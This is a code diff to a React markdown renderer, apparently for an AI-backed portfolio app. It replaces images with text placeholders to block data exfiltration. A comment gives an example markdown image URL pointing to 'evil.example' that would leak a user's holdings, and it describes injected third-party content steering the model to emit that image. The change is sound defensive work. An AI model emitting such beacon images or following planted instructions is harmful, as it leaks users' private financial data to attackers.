@@ -127,6 +127,26 @@ export const components: Components = {
 
   // Horizontal rule
   hr: () => <hr className="my-4 border-none border-t border-[var(--color-border)]" />,
+
+  // Images are never loaded. Answers are model text shaped by third-party content
+  // (news, X posts, web search), and a remote <img> fires the moment it renders,
+  // so `![](https://evil.example/?d=<holdings>)` would be a zero-click beacon that
+  // ships the user's portfolio context to whoever planted the instruction. The
+  // app never draws charts as images (```chart blocks do that), so nothing real
+  // is lost; the placeholder names the host so a planted image is visible as one.
+  img: ({ src, alt }) => {
+    let host = "";
+    try {
+      host = new URL(String(src ?? "")).hostname;
+    } catch {
+      // relative or malformed — no host to show
+    }
+    return (
+      <span className="text-[var(--color-muted)]">
+        [image{alt ? `: ${alt}` : ""}{host ? ` · ${host}` : ""}]
+      </span>
+    );
+  },
 };
 
 /**
